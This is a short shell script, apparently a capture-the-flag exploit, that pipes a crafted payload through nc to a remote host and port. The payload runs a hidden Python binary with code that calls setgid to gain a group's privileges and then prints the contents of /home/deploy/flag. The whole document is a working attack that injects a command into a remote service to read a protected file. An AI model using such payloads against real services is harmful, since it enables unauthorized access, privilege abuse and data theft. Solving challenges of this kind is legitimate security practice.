#!/bin/sh

printf $'131\n/home/deploy/secret_python_others_should_never_know -c \'__import__("os").setgid(1001);print(open("/home/deploy/flag").read())\' 1>&2\n' | nc 3.115.58.219 9427

